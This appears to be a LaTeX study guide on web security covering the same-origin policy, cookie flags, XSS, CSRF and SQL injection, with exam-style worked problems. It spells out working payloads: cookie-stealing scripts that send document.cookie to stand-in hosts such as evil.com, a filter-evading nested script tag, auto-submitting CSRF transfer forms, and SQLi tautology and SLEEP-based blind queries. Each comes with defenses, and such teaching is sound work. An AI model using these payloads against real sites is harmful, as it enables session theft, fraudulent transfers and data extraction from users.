@@ -1,0 +1,237 @@
+\section{Web Application Security: SOP, Cookies, XSS, CSRF, and SQL Injection}
+
+\subsection{Same-Origin Policy (SOP), Cookie Scope Rules, and Attacker Models}
+Web security is governed by browser isolation boundaries and stateless HTTP request/response semantics over URLs $U = \code{scheme://domain:port/path?query}$.
+\begin{compactitem}
+  \item \term{Web Attacker vs.\ Network Attacker:} A \textbf{web attacker} controls malicious origins (e.g., \code{https://attacker.com}) and induces the victim's browser to visit them or click links, but cannot intercept network packets. A \textbf{network attacker} sits on the wire (eavesdropping/modifying unencrypted HTTP traffic; defeated by HTTPS/TLS with \code{Secure} cookies).
+  \item \term{DOM Same-Origin Policy (SOP) Origin Triple:}
+  \[
+    \mathrm{Origin}(U) = \big(\mathrm{scheme},\; \mathrm{domain},\; \mathrm{port}\big), \quad \text{e.g., } \big(\code{https},\; \code{www.bank.com},\; 443\big).
+  \]
+  Two contexts share the same DOM origin iff \textbf{all three components match identically}:
+  \[
+    \mathrm{Origin}(U_1) = \mathrm{Origin}(U_2) \iff (\mathrm{scheme}_1 = \mathrm{scheme}_2) \;\land\; (\mathrm{domain}_1 = \mathrm{domain}_2) \;\land\; (\mathrm{port}_1 = \mathrm{port}_2).
+  \]
+  \item \term{Three Fundamental SOP Execution Rules:}
+  \begin{enumerate}[label=\arabic*., leftmargin=1.5em]
+    \item \emph{Cross-Origin Read Prohibition:} A script executing in origin $O_1$ \textbf{cannot read} the DOM, \code{document.cookie}, or HTTP response body of any resource belonging to $O_2 \neq O_1$ (unless $O_2$ explicitly opts in via \code{CORS} headers or \code{postMessage}).
+    \item \emph{Cross-Origin Script Inclusion Rule:} A script loaded via \code{<script src="https://attacker.com/evil.js">} inside a page served from $O_{\text{victim}} = (\code{https}, \code{bank.com}, 443)$ \textbf{executes with the embedding page's origin $O_{\text{victim}}$}, not \code{attacker.com}'s origin.
+    \item \emph{Cross-Origin Request Sending Asymmetry:} SOP \textbf{does not block sending} cross-origin HTTP requests (e.g., via \code{<img src="...">}, \code{<script src="...">}, or \code{<form action="..." method="POST">}). This asymmetry is the exact root cause of \term{CSRF}.
+  \end{enumerate}
+\end{compactitem}
+
+\begin{table}[h!]
+\centering
+\footnotesize
+\begin{tabularx}{\textwidth}{@{}L{2.5cm} L{3.7cm} L{2.2cm} Y@{}}
+\toprule
+\textbf{Policy / Flag} & \textbf{Matching Tuple / Syntax} & \textbf{Port / Scheme Sensitive?} & \textbf{Exact Browser Enforcement \& Security Consequence} \\
+\midrule
+\term{DOM SOP} & $(\text{scheme}, \text{domain}, \text{port})$ & \textbf{Yes} / \textbf{Yes} & Isolates DOM, JS variables, and \code{fetch}/\code{XHR} response reading. \code{http://a.com:80} $\neq$ \code{https://a.com:443} $\neq$ \code{http://sub.a.com:80}. \\
+\term{Cookie Scope} & $(\text{Domain}, \text{Path})$ & \textbf{No} (ignores port) & Browser attaches cookie to request URL $U$ iff cookie's \code{Domain} is a domain-suffix of $\mathrm{host}(U)$ (or exact host match if \code{Domain} omitted) and \code{Path} is a prefix of $\mathrm{path}(U)$. A page may set cookies for its own host or parent domain (excluding public suffixes like \code{.com}). \\
+\term{\texttt{HttpOnly}} & \code{Set-Cookie: sid=...; HttpOnly} & N/A & Blocks client-side JS from reading/writing the cookie via \code{document.cookie} (prevents direct XSS cookie theft). \textbf{Does not stop CSRF} (browser still attaches cookie to requests) and \textbf{does not stop XSS from issuing authenticated same-origin requests}. \\
+\term{\texttt{Secure}} & \code{Set-Cookie: sid=...; Secure} & HTTPS only & Browser transmits cookie \textbf{only over encrypted HTTPS connections}; prevents network eavesdroppers from stealing the cookie over plain HTTP. \\
+\term{\texttt{SameSite=Strict}} & \code{Set-Cookie: sid=...; SameSite=Strict} & Same-site only & Browser \textbf{never attaches} the cookie to cross-site requests initiated from external domains (e.g., \code{attacker.com}), neutralizing classic cross-origin CSRF. \\
+\bottomrule
+\end{tabularx}
+\end{table}
+
+\begin{table}[h!]
+\centering
+\footnotesize
+\begin{tabularx}{\textwidth}{@{}L{2.6cm} L{2.8cm} L{2.8cm} L{3.0cm} Y@{}}
+\toprule
+\textbf{Attack Class} & \textbf{Where Payload Runs} & \textbf{Exploited Trust} & \textbf{Reads Victim Data?} & \textbf{Primary Root-Cause Defense} \\
+\midrule
+\term{XSS} (Stored / Reflected / DOM) & Victim's browser in $\mathrm{Origin}(\text{victim})$ & Browser's trust in server/DOM HTML & \textbf{Yes} (DOM, responses, non-\code{HttpOnly} cookies) & Context-aware output encoding/escaping (\code{<} $\to$ \code{\&lt;}) $+$ \textbf{CSP} (\code{default-src 'self'; script-src ...} blocks inline scripts). \\
+\term{CSRF} (Cross-Site Request Forgery) & Victim's browser (initiated from \code{attacker.com}) & Server's trust in ambient browser cookies & \textbf{No} (SOP blocks reading cross-origin response; blind side-effect only) & Unpredictable per-session \textbf{anti-CSRF token} inside form/header verified by server $+$ \code{SameSite} cookies $+$ \code{Origin}/\code{Referer} check. \\
+\term{SQL Injection (SQLi)} & Backend database server & DB parser's trust in string-concatenated SQL & \textbf{Yes} (via output, boolean count, or \code{SLEEP} timing) & \textbf{Parameterized queries / Prepared statements} (binds user input strictly as literal data, never parsed as SQL command syntax). \\
+\bottomrule
+\end{tabularx}
+\end{table}
+
+\subsection{Applied Solution Scheme: Procedural Web Exploit Construction \& Defense Analysis}
+
+\begin{schemebox}{6-Step Web Vulnerability Classification, Payload Synthesis, and Origin/Cookie Verification}
+\begin{enumerate}[label=\textbf{Step \arabic*:}, leftmargin=3.8em]
+  \item \textbf{Classify the Execution Boundary and Target Objective:}
+  \begin{compactitem}
+    \item \emph{Execute JS inside $\mathrm{Origin}(\text{victim})$ / Exfiltrate DOM or Cookie:} Select \textbf{XSS} (\term{Stored} if persisted in DB such as profile/comment/album title; \term{Reflected} if echoed immediately from URL parameter \code{?msg=}; \term{DOM-based} if client-side JS sinks \code{location.href}/\code{innerHTML} without server echo).
+    \item \emph{Trigger State-Changing Action on \code{victim.com} When Victim Visits \code{attacker.com} (No JS Injection on Victim):} Select \textbf{CSRF}.
+    \item \emph{Subvert Backend SQL Query Built via String Concatenation \code{"... '\$in' ..."}:} Select \textbf{SQL Injection (SQLi)}.
+  \end{compactitem}
+
+  \item \textbf{Audit Input Sanitization, Cookie Attributes, and Observation Channels:}
+  \begin{compactitem}
+    \item \emph{Cookie Flag Gate:} Check \code{HttpOnly}. If \code{HttpOnly=false}, XSS reads \code{document.cookie} and exfiltrates it to \code{attacker.com}. If \code{HttpOnly=true}, \code{document.cookie} is inaccessible to JS; the XSS payload must instead issue a same-origin state-changing request (\code{fetch('/action', ...)}) directly from the victim's browser.
+    \item \emph{Filter Evasion Check:} If the server applies a single-pass non-recursive string removal \code{replace("<script>", "")}, construct a nested token \code{<scr<script>ipt>} so removing the inner \code{<script>} reassembles \code{<script>}. If \code{<script>} is blocked entirely, use an HTML event handler \code{<img src=x onerror="...">}.
+    \item \emph{SQLi Channel Gate:} Identify string quote delimiter (\code{'} or \code{"}), comment token (\code{-- } with trailing space, or \code{\#}), and output channel: (i) full rows printed $\to$ \code{UNION SELECT} or tautology \code{' OR 1=1 -- }; (ii) only row count / boolean printed $\to$ boolean-inference \code{' AND <cond> -- }; (iii) output completely constant/suppressed $\to$ time-based blind \code{' AND <cond> AND SLEEP(10)=1 -- }.
+  \end{compactitem}
+
+  \item \textbf{Synthesize the Exact Exploit Payload:}
+  \begin{compactitem}
+    \item \emph{XSS Cookie-Theft Payload (\code{HttpOnly=false}):}
+    \[
+      \code{<script>fetch("https://attacker.com/steal?c=" + encodeURIComponent(document.cookie));</script>}
+    \]
+    \item \emph{CSRF GET Payload (hosted on \code{https://attacker.com/index.html}):}
+    \[
+      \code{<img src="https://victim.com/transfer?to=mallory\&amount=1000" width="0" height="0">}
+    \]
+    \item \emph{CSRF POST Payload (auto-submitted hidden form on \code{https://attacker.com/index.html}):}
+    \begin{codeblock}
+<form id="csrf" action="https://victim.com/transfer" method="POST">\\
+\hspace*{1.5em} <input type="hidden" name="to" value="mallory">\\
+\hspace*{1.5em} <input type="hidden" name="amount" value="1000">\\
+</form>\\
+<script>document.getElementById("csrf").submit();</script>
+    \end{codeblock}
+    \item \emph{SQLi Payloads (injected into \code{SELECT ... WHERE col = '\$input';}):}
+    \begin{align*}
+      \textbf{Auth Bypass / All Rows:} \quad & \code{' OR 1=1 -- } \quad \text{or} \quad \code{admin' -- } \\
+      \textbf{Boolean Inference:} \quad & \code{validKey' AND targetCol = 'TargetVal' -- } \\
+      \textbf{Time-Based Blind SQLi:} \quad & \code{validKey' AND targetCol = 'TargetVal' AND SLEEP(10) = 1 -- }
+    \end{align*}
+  \end{compactitem}
+
+  \item \textbf{Trace the Resulting AST / Browser Execution and Verify Origin \& Cookie Rules:}
+  Write out the exact post-injection SQL query string or HTML DOM tree. Show explicitly how quotes close the preceding literal, how the injected AST node evaluates, and how \code{-- } neutralizes the server's trailing quote. For browser attacks, verify $(\mathrm{scheme}, \mathrm{domain}, \mathrm{port})$ for DOM SOP and $(\mathrm{Domain}, \mathrm{Path}, \code{HttpOnly}, \code{Secure}, \code{SameSite})$ for cookies.
+
+  \item \textbf{State Mandatory Operational Assumptions:}
+  For XSS/CSRF: victim has an active authenticated session cookie on \code{victim.com} (and \code{SameSite} is not \code{Strict} for CSRF). For Time-Based Blind SQLi: the database engine uses \term{left-to-right short-circuit evaluation} of \code{AND} so \code{SLEEP(10)=1} executes \emph{if and only if} the preceding conjuncts evaluate to true.
+
+  \item \textbf{Specify the Exact Root-Cause Countermeasure:}
+  Match the defense to the parser boundary: \textbf{Prepared Statements / Parameterized Queries} for SQLi; \textbf{HTML/JS Context-Aware Escaping + CSP} for XSS; \textbf{Cryptographic Anti-CSRF Tokens + \code{SameSite=Strict}} for CSRF.
+\end{enumerate}
+\end{schemebox}
+
+\begin{verifybox}{Origin Comparisons, Cookie Flags, and SQL Syntax Balance}
+\begin{compactitem}
+  \item \textbf{SOP vs.\ Cookie Port/Subdomain Asymmetry:} Two pages at \code{https://app.bank.com:443} and \code{https://app.bank.com:8443} have \textbf{different DOM origins} (cannot read each other's DOM), but \textbf{share cookies} (cookies ignore port). Conversely, \code{https://a.bank.com} and \code{https://b.bank.com} have different DOM origins, yet share cookies set with \code{Domain=bank.com}.
+  \item \textbf{\texttt{HttpOnly} Does Not Prevent Forged Actions:} When \code{HttpOnly=true}, any attack step that writes \code{document.cookie} scores zero because \code{document.cookie} returns an empty string for that cookie. Instead, either use CSRF (browser attaches cookie automatically) or use XSS to invoke \code{fetch('/transfer', ...)} (same-origin request carries the \code{HttpOnly} cookie automatically).
+  \item \textbf{SQL Quote \& Comment Balance:} Always substitute your payload string literally into the template \code{'\$input'} and check that every opened single quote \code{'} is closed before the injected SQL keywords and that the trailing server quote \code{'} is commented out by \code{-- } (including the space after \code{--}).
+\end{compactitem}
+\end{verifybox}
+
+\subsection{Worked Applied Problem Templates}
+
+\begin{templatebox}{8A --- SOP/Cookie Matrix, Filter-Evasion XSS, \texttt{HttpOnly} Action Forgery, and POST CSRF}
+\textbf{Problem Specification:} A banking web application at \code{https://www.bank.se:443} authenticates users with a session cookie:
+\[
+  \code{Set-Cookie: sid=9f8a7b; Domain=bank.se; Path=/; Secure}
+\]
+(Note: \code{HttpOnly} and \code{SameSite} are initially \emph{not} set.) The application has two endpoints:
+\begin{compactitem}
+  \item \code{GET /search?q=X}: sanitizes \code{X} once via non-recursive removal \code{X = X.replace("<script>", "").replace("</script>", "")} and echoes the result directly into the HTML response body.
+  \item \code{POST /transfer}: accepts form parameters \code{to} and \code{amount} and transfers \code{amount} SEK from the logged-in user to \code{to}.
+\end{compactitem}
+\textbf{Tasks:} (a) Determine whether a script on \code{http://api.bank.se:80} can read the DOM of \code{https://www.bank.se:443}, and whether the browser attaches \code{sid} to requests to \code{http://api.bank.se:80} and \code{https://api.bank.se:8443}. (b) Construct a URL that a web attacker (\code{https://evil.com}) can send to a logged-in victim to steal \code{sid}. (c) Suppose the bank adds \code{HttpOnly} to \code{sid}. Explain why attack (b) fails, and construct both a new XSS payload via \code{/search} and a pure CSRF payload hosted on \code{https://evil.com} that transfer 5000 SEK to \code{mallory}. (d) State the exact defenses required to stop both attacks in (c).
+
+\medskip
+\textbf{Procedural Solution Execution:}
+\begin{itemize}
+  \item \textbf{Step 4 (SOP \& Cookie Scope Verification --- Task a):}
+  \begin{compactitem}
+    \item \emph{DOM Read:} $\mathrm{Origin}_1 = (\code{http}, \code{api.bank.se}, 80) \neq \mathrm{Origin}_2 = (\code{https}, \code{www.bank.se}, 443)$ (differ in scheme, domain, and port) $\implies$ \textbf{Blocked by SOP}.
+    \item \emph{Cookie to \code{http://api.bank.se:80}:} Although \code{bank.se} suffixes \code{api.bank.se}, the cookie has flag \code{Secure} and the request uses plain \code{http} $\implies$ \textbf{Not attached}.
+    \item \emph{Cookie to \code{https://api.bank.se:8443}:} Uses \code{https} (\code{Secure} satisfied), \code{bank.se} suffixes \code{api.bank.se}, \code{Path=/} prefixes \code{/}, and cookies ignore port $8443$ $\implies$ \textbf{Attached}.
+  \end{compactitem}
+  \item \textbf{Steps 1--3 (Reflected XSS with Single-Pass Filter Evasion --- Task b):}
+  Goal is cookie theft via Reflected XSS on \code{/search?q=}. To bypass the single-pass removal of \code{<script>} and \code{</script>}, nest the tags as \code{<scr<script>ipt>} and \code{</scr</script>ipt>}. After the server strips the inner substring once, the outer halves join into valid \code{<script>...</script>} tags:
+  \begin{codeblock}
+https://www.bank.se/search?q=<scr<script>ipt>fetch("https://evil.com/log?c="+document.cookie)</scr</script>ipt>
+  \end{codeblock}
+  When the victim clicks this link, the reconstructed script executes inside $\mathrm{Origin}=(\code{https}, \code{www.bank.se}, 443)$, reads \code{document.cookie} (\code{sid=9f8a7b}), and sends it to \code{evil.com}.
+  \item \textbf{Steps 2--3 (\code{HttpOnly} Constraint, Same-Origin XSS Action \& POST CSRF --- Task c):}
+  With \code{HttpOnly} enabled, JS cannot read \code{sid} via \code{document.cookie}, so exfiltrating the token in (b) fails. However, the browser still attaches \code{sid} to HTTP requests to \code{www.bank.se}:
+  \begin{compactitem}
+    \item \emph{Modified XSS Payload (triggers same-origin POST from victim's browser):}
+    \begin{codeblock}
+<scr<script>ipt>fetch("/transfer", \{method:"POST", body:"to=mallory\&amount=5000"\})</scr</script>ipt>
+    \end{codeblock}
+    \item \emph{Pure POST CSRF Payload (HTML page hosted on \code{https://evil.com/win.html}):}
+    \begin{codeblock}
+<form id="f" action="https://www.bank.se/transfer" method="POST">\\
+\hspace*{1.5em} <input type="hidden" name="to" value="mallory">\\
+\hspace*{1.5em} <input type="hidden" name="amount" value="5000">\\
+</form>\\
+<script>document.getElementById("f").submit();</script>
+    \end{codeblock}
+  \end{compactitem}
+  \item \textbf{Step 6 (Root-Cause Countermeasures --- Task d):}
+  (1) To fix XSS on \code{/search}: replace blacklist stripping with context-aware HTML entity escaping (\code{<} $\to$ \code{\&lt;}, \code{>} $\to$ \code{\&gt;}, \code{"} $\to$ \code{\&quot;}) and deploy \code{Content-Security-Policy: default-src 'self'} (disabling inline scripts). (2) To fix CSRF on \code{/transfer}: embed a cryptographically random, per-session anti-CSRF token inside the transfer form (which \code{evil.com} cannot read due to SOP) and set \code{SameSite=Strict} on the \code{sid} cookie.
+\end{itemize}
+\end{templatebox}
+
+\begin{templatebox}{8B --- SQL Injection Escalation: Auth Bypass, Boolean Count Inference, and Time-Based Blind \texttt{SLEEP}}
+\textbf{Problem Specification:} An opera ticketing site takes user input \code{\$operaName} and executes the SQL query:
+\[
+  \code{SELECT customerName FROM tickets WHERE operaName = '\$operaName';}
+\]
+by directly substituting \code{\$operaName} into the query string (single quotes \code{'} delimit string literals and \code{-- } starts a SQL comment).
+\begin{compactitem}
+  \item \emph{Version 1 (Count Displayed):} The page prints \code{"N tickets sold"} where $N$ is the number of returned rows, without printing \code{customerName}.
+  \item \emph{Version 2 (Output Suppressed):} A developer patches the page so it always prints \code{"Ticket count not available"}, but the SQL query still runs before the message is rendered. Input \code{Carmen} consistently responds in $< 2$ seconds. The DBMS supports \code{SLEEP(X)}, which pauses evaluation for $X$ seconds and returns \code{1}.
+\end{compactitem}
+\textbf{Tasks:} (a) In Version 1, provide an input \code{\$operaName} that returns the total number of tickets sold across \emph{all} operas. (b) In Version 1, provide an input \code{\$operaName} that determines whether \code{Bob} holds a ticket for \code{Carmen}. (c) In Version 2, provide an input \code{\$operaName} that determines whether \code{Bob} holds a ticket for \code{Carmen}, explain the observation mechanism, and state any required DBMS evaluation assumption. (d) State the exact code-level fix.
+
+\medskip
+\textbf{Procedural Solution Execution:}
+\begin{itemize}
+  \item \textbf{Steps 1--4 (Tautology / All-Rows Injection --- Task a):}
+  Supply input:
+  \[
+    \code{\$operaName} = \code{' OR 1=1 -- }
+  \]
+  Resulting query: \code{SELECT customerName FROM tickets WHERE operaName = '' OR 1=1 -- ';}. Because \code{1=1} is universally true for every row and \code{-- } comments out the trailing quote, the query selects all rows in \code{tickets} and Version 1 displays the total count of all tickets sold.
+  \item \textbf{Steps 2--4 (Boolean-Inference SQLi via Row Count --- Task b):}
+  Supply input:
+  \[
+    \code{\$operaName} = \code{Carmen' AND customerName = 'Bob' -- }
+  \]
+  Resulting query: \code{SELECT customerName FROM tickets WHERE operaName = 'Carmen' AND customerName = 'Bob' -- ';}. Version 1 displays \code{"N tickets sold"}: if $N \ge 1$, Bob has a ticket for Carmen; if $N = 0$, Bob does not.
+  \item \textbf{Steps 2--5 (Time-Based Blind SQLi via \code{SLEEP} --- Task c):}
+  Because Version 2 suppresses row counts, use response latency as the side channel. Supply input:
+  \[
+    \code{\$operaName} = \code{Carmen' AND customerName = 'Bob' AND SLEEP(10) = 1 -- }
+  \]
+  Resulting query:
+  \[
+    \code{SELECT customerName FROM tickets WHERE operaName = 'Carmen' AND customerName = 'Bob' AND SLEEP(10) = 1}
+  \]
+  \begin{compactitem}
+    \item \emph{Observation Rule:} If Bob has a ticket for Carmen, at least one row satisfies the first two conjuncts, so the DBMS evaluates \code{SLEEP(10) = 1}, delaying the HTTP response to $\ge 10\text{ s}$ (vs.\ baseline $< 2\text{ s}$). If Bob has no ticket for Carmen, no row satisfies the prefix conjuncts and the response returns in $< 2\text{ s}$.
+    \item \emph{Mandatory DBMS Assumption:} The database engine evaluates \code{AND} clauses using \term{left-to-right short-circuit evaluation} (so \code{SLEEP(10)=1} is never called for rows where \code{operaName='Carmen' AND customerName='Bob'} is false).
+  \end{compactitem}
+  \item \textbf{Step 6 (Root-Cause Remediation --- Task d):}
+  Use \term{parameterized queries (prepared statements)}: \code{PREPARE stmt FROM 'SELECT customerName FROM tickets WHERE operaName = ?'; EXECUTE stmt USING @operaName;}. The database compiles the SQL AST before binding \code{@operaName} strictly as a literal string value, making syntax injection impossible.
+\end{itemize}
+\end{templatebox}
+
+\begin{templatebox}{8C --- Stored XSS in Shared Resource: Cookie Theft vs.\ Silent Action Forgery}
+\textbf{Problem Specification:} A photo-sharing web app at \code{https://photos.example.org} lets user Mallory create an album with title \code{T} and share it with victim Alice. When Alice opens the shared album page, the server renders \code{<h2>Album: T</h2>} directly into the HTML without escaping. Alice is logged in with session cookie \code{session\_id}. The app supports \code{GET /delete\_account?confirm=yes} to delete the currently logged-in user's account.
+\textbf{Tasks:} (a) Classify the vulnerability and construct an album title \code{T} that steals Alice's \code{session\_id} to \code{https://mallory.org/collect} when \code{HttpOnly=false}. (b) Suppose the administrator sets \code{HttpOnly=true} and \code{SameSite=Strict} on \code{session\_id}. Determine whether Mallory can still steal \code{session\_id}, and construct an album title \code{T} that deletes Alice's account when she views the album.
+
+\medskip
+\textbf{Procedural Solution Execution:}
+\begin{itemize}
+  \item \textbf{Steps 1--3 (Stored XSS Cookie Exfiltration --- Task a):}
+  Because album title \code{T} is persisted on the server and rendered unescaped into Alice's browser under $\mathrm{Origin} = (\code{https}, \code{photos.example.org}, 443)$, this is \term{Stored XSS}. With \code{HttpOnly=false}, Mallory sets the album title to:
+  \[
+    \code{T} = \code{Vacation</h2><script>fetch("https://mallory.org/collect?sid=" + document.cookie);</script><h2>}
+  \]
+  When Alice views the album, her browser executes the script in \code{photos.example.org}'s origin, reads \code{document.cookie}, and transmits \code{session\_id} to \code{mallory.org} (SOP allows outbound cross-origin requests).
+  \item \textbf{Steps 2--4 (\code{HttpOnly=true} + \code{SameSite=Strict} vs.\ Stored XSS Action Forgery --- Task b):}
+  \begin{compactitem}
+    \item \emph{Cookie Theft Verdict:} \textbf{Impossible.} \code{HttpOnly=true} prevents JavaScript from reading \code{session\_id} via \code{document.cookie}.
+    \item \emph{Account Deletion Verdict:} \textbf{Possible via Stored XSS.} Because the injected script executes inside $\mathrm{Origin}(\code{https://photos.example.org})$, any request it triggers to \code{/delete\_account?confirm=yes} is a \textbf{same-origin / same-site request}, so the browser attaches the \code{HttpOnly; SameSite=Strict} cookie automatically! Mallory sets \code{T} to:
+    \[
+      \code{T} = \code{Vacation</h2><script>fetch("/delete\_account?confirm=yes");</script><h2>}
+    \]
+    (or \code{<img src="/delete\_account?confirm=yes">}). When Alice views the album, her browser sends the authenticated same-origin GET request and deletes her account.
+  \end{compactitem}
+\end{itemize}
+\end{templatebox}
+
+
+
